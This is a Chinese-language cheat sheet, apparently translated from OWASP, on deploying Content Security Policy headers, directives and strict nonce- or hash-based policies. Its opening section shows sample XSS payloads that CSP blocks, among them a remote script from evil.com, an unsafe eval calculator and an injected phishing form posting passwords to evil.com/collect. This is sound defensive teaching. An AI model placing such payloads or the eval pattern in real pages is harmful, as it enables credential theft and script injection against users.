# 内容安全策略（CSP）备忘录

## 引言

本文介绍了在 Web 应用程序客户端集成__深度防御__概念的方法。通过从服务器注入内容安全策略（Content-Security-Policy，CSP）头部，浏览器能够感知并保护用户免受加载到当前访问页面的动态调用的威胁。

## 背景

XSS（跨站脚本）、点击劫持和跨站泄漏漏洞的增加要求采用更加__深度防御__的安全方法。

### 防御 XSS

CSP 通过以下方式防御 XSS 攻击：

#### 1. 限制内联脚本

通过阻止页面执行内联脚本，如下攻击将无法生效：

```html
<script>document.body.innerHTML='defaced'</script>
```

#### 2. 限制远程脚本

通过阻止页面从任意服务器加载脚本，如下攻击将无法生效：

```html
<script src="https://evil.com/hacked.js"></script>
```

#### 3. 限制不安全的 JavaScript

通过阻止页面执行 `eval` 等文本转 JavaScript 的函数，网站将免受如下漏洞的威胁：

```js
// 一个简单的计算器
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);
```

#### 4. 限制表单提交

通过限制网站上的 HTML 表单可以提交数据的位置，注入钓鱼表单也将无法生效：

```html
<form method="POST" action="https://evil.com/collect">
<h3>会话已过期！请重新登录。</h3>
<label>用户名</label>
<input type="text" name="username"/>

<label>密码</label>
<input type="password" name="pass"/>

<input type="Submit" value="登录"/>
</form>
```

#### 5. 限制对象

通过限制 HTML [object](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object) 标签，攻击者也无法在页面上注入恶意的 Flash/Java 或其他遗留可执行文件。

### 防御框架攻击

点击劫持和某些变体的浏览器侧信道攻击（xs-leaks）需要恶意网站在框架中加载目标网站。

历史上，`X-Frame-Options` 头部曾用于此目的，但现已被 `frame-ancestors` CSP 指令取代。

### 深度防御

强大的 CSP 为各类漏洞（尤其是 XSS）提供了有效的**第二层**保护。尽管 CSP 不能阻止 Web 应用程序*包含*漏洞，但它可以使攻击者更难利用这些漏洞。

即使是完全静态的网站，不接受任何用户输入，CSP 也可用于强制使用[子资源完整性（SRI）](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)。如果托管 JavaScript 文件的第三方站点（如分析脚本）被入侵，这可以帮助防止恶意代码加载到网站上。

话虽如此，CSP **不应**被视为防御 XSS 的唯一防御机制。你仍然必须遵循[跨站脚本防御速查表](Cross_Site_Scripting_Prevention_Cheat_Sheet.md)中描述的良好开发实践，然后将 CSP 部署为额外的安全层。

## 策略传递

你可以通过三种方式将内容安全策略传递到你的网站。

### 1. Content-Security-Policy 头部

从 Web 服务器发送 Content-Security-Policy HTTP 响应头部。

```text
Content-Security-Policy: ...
```

使用头部是首选方式，并支持完整的 CSP 功能集。在所有 HTTP 响应中发送，不仅仅是索引页面。

这是一个 W3C 规范标准头部。被 Firefox 23+、Chrome 25+ 和 Opera 19+ 支持。

### 2. Content-Security-Policy-Report-Only 头部

使用 `Content-Security-Policy-Report-Only`，你可以传递一个不会被执行的 CSP。

```text
Content-Security-Policy-Report-Only: ...
```

尽管如此，违规报告仍会打印到控制台，并在使用 `report-to` 和 `report-uri` 指令时传递到违规端点。

这也是一个 W3C 规范标准头部。被 Firefox 23+、Chrome 25+ 和 Opera 19+ 支持，其中策略是非阻塞的（"失败开放"），并向 `report-uri`（或较新的 `report-to`）指令指定的 URL 发送报告。这通常用作在阻塞模式（"失败关闭"）下使用 CSP 的前奏。

浏览器完全支持网站同时使用 `Content-Security-Policy` 和 `Content-Security-Policy-Report-Only`，没有任何问题。例如，可以使用这种模式运行严格的 `Report-Only` 策略（获取大量违规报告），同时保持一个较为宽松的强制策略（以避免破坏合法的站点功能）。

### 3. Content-Security-Policy 元标签

有时，如果你在无法控制头部的 CDN 上部署 HTML 文件，则无法使用 Content-Security-Policy 头部。

在这种情况下，你仍可以通过在 HTML 标记中指定 `http-equiv` 元标签来使用 CSP：

```html
<meta http-equiv="Content-Security-Policy" content="...">
```

几乎所有内容仍然受支持，包括完整的 XSS 防御。但是，你将无法使用[框架保护](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)、[沙盒](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)或 [CSP 违规日志端点](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)。

### 警告

**不要**使用 `X-Content-Security-Policy` 或 `X-WebKit-CSP`。它们的实现已过时（自 Firefox 23、Chrome 25 起），受限、不一致且极其有缺陷。

## CSP 类型（细粒度/基于白名单或严格）

最初构建 CSP 的机制涉及创建允许列表，定义在 HTML 页面上下文中允许的内容和来源。

然而，当前的领先实践是创建一个"严格"的 CSP，它更易于部署且更安全，不太可能被绕过。

## 严格 CSP

通过使用下面列出的少量粒度[获取指令](#获取指令)以及以下两种机制之一，可以创建严格的 CSP：

- 随机数（Nonce）基础
- 哈希基础

可以选择性地使用 `strict-dynamic` 指令，使实现严格 CSP 更加容易。

以下部分将提供这些机制的基本指导，但强烈建议遵循 Google 关于创建严格 CSP 的详细和系统的说明：

**[使用严格的内容安全策略（CSP）缓解跨站脚本（XSS）](https://web.dev/strict-csp/)**

### 随机数（Nonce）基础

随机数是为每个 HTTP 响应生成的唯一一次性随机值，并添加到内容安全策略头部，如下所示：

```js
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;
```

然后，你需要将此随机数传递给视图（使用随机数需要非静态 HTML），并渲染看起来像这样的脚本标签：

```html
<script nonce="<%= nonce %>">
    ...
</script>
```

#### 警告

**不要**创建一个替换所有脚本标签为 "script nonce=..." 的中间件，因为攻击者注入的脚本也会获得随机数。你需要一个实际的 HTML 模板引擎来使用随机数。

### 哈希

当需要内联脚本时，`script-src 'hash_algo-hash'` 是另一个仅允许特定脚本执行的选项。

```text
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
```

要获取哈希，查看 Google Chrome 开发者工具中的违规情况，如下：

> ❌ 由于违反以下内容安全策略指令，拒绝执行内联脚本："..." 需要 'unsafe-inline' 关键字、哈希（**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**）或随机数...

你也可以使用这个[哈希生成器](https://report-uri.com/home/hash)。这是使用哈希的一个很好的[示例](https://csp.withgoogle.com/docs/faq.html#static-content)。

#### 注意

使用哈希可能是一种有风险的方法。如果你更改脚本标签内的*任何*内容（甚至空白），例如格式化代码，哈希将会不同，脚本将无法渲染。

### strict-dynamic

`strict-dynamic` 指令可以与哈希或随机数结合使用，作为严格 CSP 的一部分。

如果具有正确哈希或随机数的脚本块正在创建额外的 DOM 元素并在其中执行 JS，`strict-dynamic` 会告诉浏览器也信任这些元素，而无需为每个元素显式添加随机数或哈希。

请注意，虽然 `strict-dynamic` 是 CSP 第 3 级功能，但 CSP 第 3 级在常见的现代浏览器中得到了非常广泛的支持。

有关更多详细信息，请查看 [strict-dynamic 使用](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage)。

## 详细的 CSP 指令

存在多种类型的指令，允许开发人员精细地控制策略流。请注意，创建一个过于细粒度或过于宽松的非严格策略可能会导致绕过和保护丢失。

### 获取指令

获取指令告诉浏览器要信任和加载资源的位置。

大多数获取指令都有 [w3 中指定的特定回退列表](https://www.w3.org/TR/CSP3/#directive-fallback-list)。此列表允许对脚本、图像、文件等资源的来源进行精细控制。

- `child-src` 允许开发人员控制嵌套的浏览上下文和工作者执行上下文。
- `connect-src` 提供对获取请求、XHR、事件源、信标和 WebSocket 连接的控制。
- `font-src` 指定可以从哪些 URL 加载字体。
- `img-src` 指定可以从哪些 URL 加载图像。
- `manifest-src` 指定可以从哪些 URL 加载应用程序清单。
- `media-src` 指定可以从哪些 URL 加载视频、音频和文本轨道资源。
- `prefetch-src` 指定可以从哪些 URL 预取资源。
- `object-src` 指定可以从哪些 URL 加载插件。
- `script-src` 指定可以从哪些位置执行脚本。它是其他脚本类似指令的回退指令。
    - `script-src-elem` 控制脚本请求和块的执行位置。
    - `script-src-attr` 控制事件处理程序的执行。
- `style-src` 控制应用于文档的样式。这包括 `<link>` 元素、`@import` 规则以及源自 `Link` HTTP 响应头字段的请求。
    - `style-src-elem` 控制内联属性以外的样式。
    - `style-src-attr` 控制样式属性。
- `default-src` 是其他获取指令的回退指令。指定的指令没有继承，但未指定的指令将回退到 `default-src` 的值。

### 文档指令

文档指令指示浏览器关于将应用策略的文档的属性。

- `base-uri` 指定 `<base>` 元素可以使用的可能 URL。
- `plugin-types` 限制可以加载到文档中的资源类型（*例如* application/pdf）。对受影响的元素 `<embed>` 和 `<object>` 有 3 条规则：
    - 元素需要显式声明其类型。
    - 元素的类型需要匹配声明的类型。
    - 元素的资源需要匹配声明的类型。
- `sandbox` 限制页面的操作，如提交表单。
    - 仅在与请求头 `Content-Security-Policy` 一起使用时适用。
    - 不指定指令值将激活所有沙盒限制。`Content-Security-Policy: sandbox;`
    - [沙盒语法](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)

### 导航指令

导航指令指示浏览器关于文档可以导航到或被嵌入的位置。

- `form-action` 限制表单可以提交到的 URL。
- `frame-ancestors` 限制可以在 `<frame>`、`<iframe>`、`<object>`、`<embed>` 或 `<applet>` 元素内嵌入请求资源的 URL。
    - 如果在 `<meta>` 标签中指定此指令，则该指令将被忽略。
    - 此指令不会回退到 `default-src` 指令。
    - `X-Frame-Options` 被此指令废弃，并被用户代理忽略。

### 报告指令

报告指令将被阻止行为的违规情况传递到指定位置。这些指令本身没有任何作用，依赖于其他指令。

- `report-to` 在 JSON 格式的头部值中定义的组名。
    - [MDN report-to 文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
- `report-uri` 指令已被 `report-to` 废弃，是发送报告的 URI。
    - 遵循以下格式：`Content-Security-Policy: report-uri https://example.com/csp-reports`

为确保向后兼容，请同时使用这两个指令。当浏览器支持 `report-to` 时，它将忽略 `report-uri`。否则，将使用 `report-uri`。

### 特殊指令源

| 值               | 描述                                                         |
|------------------|--------------------------------------------------------------|
| 'none'           | 没有 URL 匹配。                                              |
| 'self'           | 指同一来源站点，具有相同的方案和端口号。                     |
| 'unsafe-inline'  | 允许使用内联脚本或样式。                                     |
| 'unsafe-eval'    | 允许在脚本中使用 eval。                                      |

要更好地理解指令源的工作原理，请查看 [w3c 的源列表](https://w3c.github.io/webappsec-csp/#framework-directive-source-list)。

## CSP 示例策略

### 严格策略

严格策略的作用是防御经典的存储型、反射型和部分 DOM XSS 攻击，应该是任何尝试实施 CSP 的团队的最佳目标。

如上所述，Google 为创建严格 CSP 提供了详细和系统的[说明](https://web.dev/strict-csp)。

基于这些说明，可以使用以下两种策略中的一种来应用严格策略：

#### 基于随机数的严格策略

```text
Content-Security-Policy:
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

#### 基于哈希的严格策略

```text
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```

### 基本非严格 CSP 策略

如果无法创建严格策略，可以使用此策略来防止跨站框架和跨站表单提交。它将仅允许来自文档源域的所有默认级别指令的资源，并且不允许执行内联脚本/样式。

如果你的应用程序可以在这些限制下正常工作，它将大大减少攻击面，并且适用于大多数现代浏览器。

最基本的策略假设：

- 所有资源都由文档的同一域托管。
- 脚本和样式资源没有内联或求值。
- 没有其他网站需要框架该网站。
- 没有向外部网站提交表单。

```text
Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
```

为了进一步收紧，可以应用以下策略：

```text
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

此策略允许来自同一源的图像、脚本、AJAX 和 CSS，并且不允许加载任何其他资源（例如，对象、框架、媒体等）。

### 升级不安全请求

如果开发人员正在从 HTTP 迁移到 HTTPS，以下指令将确保所有请求都将通过 HTTPS 发送，不会回退到 HTTP：

```text
Content-Security-Policy: upgrade-insecure-requests;
```

### 防止框架攻击（点击劫持、跨站泄漏）

- 要阻止所有内容的框架，请使用：
    - `Content-Security-Policy: frame-ancestors 'none';`
- 仅允许站点本身，请使用：
    - `Content-Security-Policy: frame-ancestors 'self';`
- 要允许受信任的域，请执行以下操作：
    - `Content-Security-Policy: frame-ancestors trusted.com;`

### 重构内联代码

当 `default-src` 或 `script-src*` 指令处于活动状态时，CSP 默认禁用 HTML 源中放置的任何 JavaScript 代码，例如：

```javascript
<script>
var foo = "314"
<script>
```

可以将内联代码移动到单独的 JavaScript 文件，页面中的代码变为：

```javascript
<script src="app.js">
</script>
```

其中 `app.js` 包含 `var foo = "314"` 代码。

内联代码限制也适用于 `内联事件处理程序`，因此在 CSP 下将阻止以下构造：

```html
<button id="button1" onclick="doSomething()">
```

这应该替换为 `addEventListener` 调用：

```javascript
document.getElementById("button1").addEventListener('click', doSomething);
```

## 参考资料

- [严格 CSP](https://web.dev/strict-csp)
- [CSP 第 3 级 W3C](https://www.w3.org/TR/CSP3/)
- [内容安全策略](https://content-security-policy.com/)
- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [CSP 维基百科](https://en.wikipedia.org/wiki/Content_Security_Policy)
- [Scott Helme 的 CSP 速查表](https://scotthelme.co.uk/csp-cheat-sheet/)
- [破坏性 CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
- [CSP：介于强化和缓解之间的成功混合](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
- [AppSec Monkey 上的内容安全策略指南](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP 生成器：[Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
- [CSP 评估器](https://csp-evaluator.withgoogle.com/)
